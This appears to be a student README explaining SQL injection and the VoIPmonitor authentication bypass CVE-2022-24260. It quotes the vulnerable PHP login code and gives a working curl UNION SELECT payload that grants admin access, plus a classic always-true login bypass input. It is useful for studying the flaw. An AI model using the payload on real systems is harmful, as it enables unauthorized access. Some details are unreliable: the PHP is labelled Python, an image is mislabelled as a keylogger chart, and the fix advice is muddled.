# SQL injection vulnerability(CVE-2022-24260)
## Useful links:
[CVE-2022-24260](https://www.cvedetails.com/cve/CVE-2022-24260/)

[Voipmonitor softeare](https://www.voipmonitor.org/product-and-services/voipmonitor-software)

[SQL Injection(Wikipedia)](https://en.wikipedia.org/wiki/SQL_injection)

[SQL Injection Cheat Sheet](https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/)

## What is SQL injection
SQL Injection is a security vulnerability that occurswhen you ask a user for input, and it is the most common and simplest vulnerability in websites.[^1] The main reason is that the program does not judge and process the legitimacy of the user input data, so that the attacker can add additional SQL statements to the predefined SQL statements in the Web application, and perform illegal operations without the administrator's knowledge. In this way, the database server can be deceived to execute unauthorized arbitrary queries, thereby further obtaining data information.

The following example is a SQL injection process.[^1]

Simple code about selecting a user.
```SQL
txtUserId = getRequestString("UserId");
txtSQL = "SELECT * FROM Users WHERE UserId = " + txtUserId;
```
If there is nothing can avoid the user enter the "smart" input, then the user can enter: 

User ID: " or ""="

Password: " or ""="

A valid SQL statement will be created:
```SQL
SELECT * FROM Users WHERE Name ="" or ""="" AND Pass ="" or ""=""
```
This SQL statement will return all usernames and corresponding passwords.

The flow chart of Keylogger[^2]:
![alt text](https://github.com/Fashion-Man/ECE-9609-9069/blob/319bc06d23bd3e178305e3984bd1e1eda1ad9d09/sql%20flowchart.png)

## A SQL injection vulnerability in Voipmonitor GUI(CVE-2022-24260)
This new sql injects for unauthenticated users allowing gaining admin privileges[^3]
![alt text](https://github.com/Fashion-Man/ECE-9609-9069/blob/2096952ca2904c53f01479636923d7ca39375454/cvss.png)

## Voipmonitor[^4][^5] 
Voipmonitor is a thing used to monitor voip. Using it, you can capture and record the message of each call, and automatically analyze the call result, data jitter, delay, packet loss, etc.,and restore the call sound according to the RTP data of the message.Calls with all relevant statistics are saved to MySQL database.

The bug occurs in the file name api.php which is also located in the webroot[^5].

In the file api.php[^5]:
```Python
switch ($_REQUEST["action"]) {
// snip to line ~36
  case "login":
        api_login();
        break;
// ... snip ...
function api_login()
{
    if (isCloud() && !function_exists("curl_init")) {
        echoError("Module php-curl is missing. Enable it, restart web server and try it again.");
        exit;
    }
    if ($_REQUEST["user"] == "") {
        echoError("missing parameter user");
        exit;
    }
    if ($_REQUEST["pass"] == "") {
        echoError("missing parameter password");
        exit;
    }
    if (isCloud()) {
        // This authentication is for cloud hosted instances, As such we won't discuss it here.
        // But the code here uses some user controllable variables to construct a url, Which might lead to something interesting.
        // ... snip ...

    }
    connect_db();
    // This function is where the sql injection exists! 
    getUpdateUserLoginData($row, $_REQUEST["user"], $_REQUEST["pass"], "users");
    if ($row) {
        // Snipped for simplicity sake, Basically parses the result and sets up a session.
    } else {
        echoError($lang["loginFailed"]);
    }
```
The code above said, Once *login* is set to **action** parameter, it will call a function **api_login()** that handles the login. This function will check the required parameters **user** and **pass** and pass these two parameters to a function named **getUpdateUserLoginData()**. This function will check if the **user** and **pass** are matched and valid. 

The function is in a file named functions.php in the /php/lib/ directory[^5]: 
```Python
function getUpdateUserLoginData(&$row, $user, $password, $table = "users", $nextCond = NULL, $assoc = false)
{
    $conds = array();
    if ($password) {
        array_push($conds, "(length(password) = 32 and `password` = '" . md5($password) . "' or length(password) = 64 and `password` = '" . hash("SHA256", $password) . "')");
    }
    if ($user) {
        array_push($conds, "" . "`username` = '" . $user . "'"); // OOF 1: Adding a user variable without quoting/escaping
    }
    if ($nextCond) {
        array_push($conds, $nextCond);
    }
    $Cond = implode(" AND ", $conds); // OOF 2: implode here has no escaping either.
    if ($assoc) {
        $row = get_row_assoc("" . "SELECT * from " . $table . " WHERE " . $Cond);
    } else {
        $row = get_row("" . "SELECT * from " . $table . " WHERE " . $Cond);
    }
    if ($row && $password && $row["password"] == md5($password)) {
        $rslt = getColumnType($table, "password");
        if (strpos($rslt, "varchar(64)") !== false || strpos($rslt, "varchar(100)") !== false) {
            update_row(array("password" => hash("SHA256", $password)), $table, "" . "id = " . $row["id"]);
        }
    }
}
```
The variable *$user* is used in an SQL statement without any type of quoting. This is then executed using **get_row()** which is a wrapper around an SQL library that just runs SQL queries. Now, the hacker can build a admin session in order to avoid **user** and **pass** login based on the UNION. 
```Python
# curl command used
curl -v http://192.168.56.103/api.php -d "module=relogin&action=login&pass=nope&user=a' UNION SELECT 'admin','admin',null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,1,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null; #"
```
[^5]![alt text](https://github.com/Fashion-Man/ECE-9609-9069/blob/6f21e008f45548a2314105ce8cca4eadc5c30fea/sqli_api_php.png)
This will allow access to the database as an administrator. More details can be found [here](https://kerbit.io/research/read/blog/3). 


## The users
Users of SQL injection are typically hackers[^6].
Hackers use SQL injection to change and update data from websites while also adding new data into a database. For example, in the context of financial applications, SQL injection can be used to change the balance of accounts and steal information[^7]. More dangerously, an attacker can obtain administrative rights to an application database. Most information that is stolen consists of login credentials, email addresses, and personally identifiable information that is then sold on the dark web[^7]. The threat posed by hackers to users and their organizations are imperative to protect against[^7]. 

## How to fix the SQL vulnerability
Since websites typically require sustained access to databases, very little and often no defense is given by firewalls against SQL injection attacks and every visitor on a website should be given access to the database. Furthermore, since antivirus programs are expected to identify and halt incoming data of a very different kind, they are equally ineffective against stopping SQL injection vulnerabilities[^8]. 

Two parts make up a defense against SQL injection vulnerabilities. The first defense is to perform routine updates of all servers and applications as well as patching all servers and applications. The second part of the defense is to mitigate attacks by assembling well-written code as well as well tested code that can prohibit SQL commands that are not foreseen[^8].  

Given these defenses, the question then rises; why are SQL injections a threat and why is the number of successful attacks rising?

Many factors contribute to the answer of this question. 
Firstly, the number of servers,volume and applications of code are rapidly increasing on web sites. Furthermore, they interact with each other in uncertain ways. Another reason could be that activities such as updating and patching servers and applications routinely that are important to defending websites may be postponed by IT departments too often which leaves websites vulnerable to attacks[^8]. Another issue that creates hidden holes in security routines is a high staff turnover and layoff rate. Lastly and simply, the number of attacks on websites and the tools required to successfully hack websites is increasing at a constant rate. To be protected, security checks must be consistent and diligent[^8]. 

## Impacts and significances of SQL injection[^9] 
1. Attackers can access data in the database without authorization, thereby stealing user data and causing user information leakage.
2. Add or delete data in the database, such as deleting a table of important data in the database.
3. If the website directory has write permission, the attacker can tamper with the webpage and publish some illegal information.
4. Obtain the highest authority of the server, remotely control the server.
5. Install backdoors to modify or control the operating system.

## References
[^1]: https://www.w3schools.com/sql/sql_injection.asp
[^2]: https://portswigger.net/web-security/sql-injection
[^3]: https://www.cvedetails.com/cve/CVE-2022-24260/
[^4]: https://www.voipmonitor.org/
[^5]: https://kerbit.io/research/read/blog/3
[^6]: https://portswigger.net/web-security/sql-injection
[^7]: https://www.contrastsecurity.com/knowledge-hub/glossary/sql-injection#:~:text=Attackers%20use%20SQL%20injection%20to,rights%20to%20an%20application%20database.
[^8]: https://beyondsecurity.com/about-sql-injection.html 
[^9]: https://www.packetlabs.net/posts/sql-injection/
